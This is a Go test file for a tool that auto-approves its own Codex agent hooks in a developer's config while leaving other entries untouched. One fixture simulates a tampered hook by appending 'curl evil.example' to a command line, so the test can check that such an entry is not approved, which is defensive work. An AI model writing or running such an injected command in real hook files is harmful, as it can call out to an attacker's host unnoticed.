package codex

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/miradorlabs/terma-cli/internal/hooks/hookmgr"
)

// userConfig is a developer's config.toml terma must leave as it is: comments, order, other
// tables, and Codex's records for hooks that are not terma's.
const userConfig = `# my settings
model = "gpt-5"

[otel]
environment = "dev"

[projects."/elsewhere"]
trust_level = "trusted"

[hooks.state]

[hooks.state."/elsewhere/.codex/hooks.json:stop:0:0"]
trusted_hash = "sha256:theirs"
enabled = true
`

// approvalSandbox is a Codex home holding terma's machine-wide hooks and userConfig, and a
// private terma config directory for the approval journal.
func approvalSandbox(t *testing.T) (hooksFile, configPath string) {
	t.Helper()
	t.Setenv("TERMA_CONFIG_DIR", t.TempDir())
	codexHome, hooksFile := userHooked(t)
	configPath = filepath.Join(codexHome, "config.toml")
	if err := os.WriteFile(configPath, []byte(userConfig), 0o600); err != nil {
		t.Fatal(err)
	}
	return hooksFile, configPath
}

func read(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// Setup approves terma's own entries, so Codex runs them with no review step, and the
// developer's config survives byte for byte ahead of them; a second sync changes nothing.
func TestSyncHookTrustApprovesTermaEntriesAndKeepsTheRest(t *testing.T) {
	hooksFile, configPath := approvalSandbox(t)
	done, err := Agent{}.SyncHookTrust(hooksFile, testCommand)
	if err != nil || done.Approved != len(codexHooks) {
		t.Fatalf("approved %+v, %v; want %d", done, err, len(codexHooks))
	}
	got := read(t, configPath)
	if !strings.HasPrefix(got, userConfig) {
		t.Fatalf("the developer's config changed:\n%s", got)
	}
	again, err := Agent{}.SyncHookTrust(hooksFile, testCommand)
	if err != nil || again.Approved != 0 || again.Withdrawn != 0 || read(t, configPath) != got {
		t.Fatalf("a second sync changed something: %+v, %v", again, err)
	}
}

// An entry someone else changed is the developer's to review, even when it calls terma;
// one the developer switched off in Codex stays off.
func TestSyncHookTrustLeavesOthersEntriesAndSwitchedOffOnes(t *testing.T) {
	hooksFile, configPath := approvalSandbox(t)
	doc := read(t, hooksFile)
	// A teammate's edit of terma's Stop entry: it still calls terma, but is not terma's.
	edited := strings.Replace(doc, `hook --user codex-stop || true`, `hook --user codex-stop || curl evil.example`, 1)
	if edited == doc {
		t.Fatal("fixture: Stop entry not found")
	}
	if err := os.WriteFile(hooksFile, []byte(edited), 0o644); err != nil {
		t.Fatal(err)
	}
	off := "\n[hooks.state.\"" + hooksFile + ":session_end:0:0\"]\nenabled = false\n"
	if err := os.WriteFile(configPath, []byte(userConfig+off), 0o600); err != nil {
		t.Fatal(err)
	}
	done, err := Agent{}.SyncHookTrust(hooksFile, testCommand)
	if err != nil || done.Approved != len(codexHooks)-2 {
		t.Fatalf("approved %+v, %v; want all but Stop and SessionEnd", done, err)
	}
	got := read(t, configPath)
	if strings.Contains(got, hooksFile+":stop:0:0") {
		t.Fatalf("a teammate's edited entry was approved:\n%s", got)
	}
	if !strings.Contains(got, off) || strings.Count(got, hooksFile+":session_end:0:0") != 1 {
		t.Fatalf("the switched-off entry was touched:\n%s", got)
	}
}

// Removing the hooks withdraws only what terma approved: an approval the developer gave first, for
// the same entry, stays theirs.
func TestSyncHookTrustWithdrawsOnlyTermasApprovals(t *testing.T) {
	hooksFile, configPath := approvalSandbox(t)
	entries, err := termaEntriesIn(hooksFile)
	if err != nil || len(entries) == 0 {
		t.Fatalf("entries: %v", err)
	}
	mine := "\n[hooks.state.\"" + hooksFile + ":" + entries[0].Key() + "\"]\ntrusted_hash = \"" + entries[0].Hash + "\"\n"
	if err := os.WriteFile(configPath, []byte(userConfig+mine), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := (Agent{}).SyncHookTrust(hooksFile, testCommand); err != nil {
		t.Fatal(err)
	}
	plan, err := planUserHooks(filepath.Dir(hooksFile), testCommand, false)
	if err != nil {
		t.Fatal(err)
	}
	if err := hookmgr.Apply(filepath.Dir(hooksFile), plan); err != nil {
		t.Fatal(err)
	}
	done, err := Agent{}.SyncHookTrust(hooksFile, testCommand)
	if err != nil || done.Withdrawn != len(codexHooks)-1 {
		t.Fatalf("withdrew %+v, %v; want all but the developer's own", done, err)
	}
	if got := read(t, configPath); got != userConfig+mine {
		t.Fatalf("withdrawal left more or less than the developer's config:\n%s", got)
	}
	if _, err := os.Stat(filepath.Join(os.Getenv("TERMA_CONFIG_DIR"), codexTrustState)); !os.IsNotExist(err) {
		t.Fatalf("the approval journal outlived the approvals: %v", err)
	}
}

// A re-setup that rewrites the machine-wide hooks (terma moved) approves the new entries
// in place of the stale ones, so Codex runs them again without a review.
func TestSyncHookTrustRefreshesStaleApprovals(t *testing.T) {
	t.Setenv("TERMA_CONFIG_DIR", t.TempDir())
	codexHome := t.TempDir()
	t.Setenv("CODEX_HOME", codexHome)
	hooksFile := filepath.Join(codexHome, "hooks.json")
	write := func(terma string) {
		t.Helper()
		plan, err := planUserHooks(codexHome, hookmgr.UserHookCommand(terma), true)
		if err != nil {
			t.Fatal(err)
		}
		if err := hookmgr.Apply(codexHome, plan); err != nil {
			t.Fatal(err)
		}
		if _, err := (Agent{}).SyncHookTrust(hooksFile, hookmgr.UserHookCommand(terma)); err != nil {
			t.Fatal(err)
		}
	}
	write("/opt/terma/bin/terma")
	write("/usr/local/bin/terma")
	if present, trusted, err := (Agent{}).UserHooksTrusted(); err != nil || !present || !trusted {
		t.Fatalf("after re-setup: present %v trusted %v, %v\n%s", present, trusted, err, read(t, filepath.Join(codexHome, "config.toml")))
	}
	// One per entry for each spelling Codex may record the file under (a symlinked temp dir has two).
	if n, want := strings.Count(read(t, filepath.Join(codexHome, "config.toml")), "[hooks.state."), len(codexHooks)*spellings(t, hooksFile); n != want {
		t.Fatalf("%d records, want %d: the stale ones were kept beside the new", n, want)
	}
}

// A config whose hooks key is not a table is refused, and left as it is.
func TestSyncHookTrustRefusesAConfigItCannotEditSafely(t *testing.T) {
	hooksFile, configPath := approvalSandbox(t)
	const odd = "hooks = \"off\"\n"
	if err := os.WriteFile(configPath, []byte(odd), 0o600); err != nil {
		t.Fatal(err)
	}
	if _, err := (Agent{}).SyncHookTrust(hooksFile, testCommand); err == nil {
		t.Fatal("no error for a hooks key that is not a table")
	}
	if read(t, configPath) != odd {
		t.Fatal("the config was rewritten")
	}
}

func spellings(t *testing.T, path string) int {
	t.Helper()
	paths, err := pathSpellings(path)
	if err != nil {
		t.Fatal(err)
	}
	return len(paths)
}
